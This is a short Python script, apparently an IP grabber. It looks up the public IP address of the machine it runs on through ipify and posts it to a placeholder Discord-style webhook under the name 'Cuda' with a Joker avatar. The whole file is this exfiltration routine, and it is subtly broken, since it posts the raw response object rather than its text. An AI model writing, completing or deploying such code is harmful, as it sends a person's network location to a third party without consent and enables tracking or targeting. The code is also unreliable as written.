import requests

url = "https://api.ipify.org/?format=json"
res = requests.get(url)

webhook = "WEBHOOK-URL-HERE"

data = {
    "content" : res,
    "avatar_url": "https://wallpapersden.com/joker-hahaha-wallpaper/5120x2880/",
    "username" : "Cuda"
}

r = requests.post(webhook, data=data )
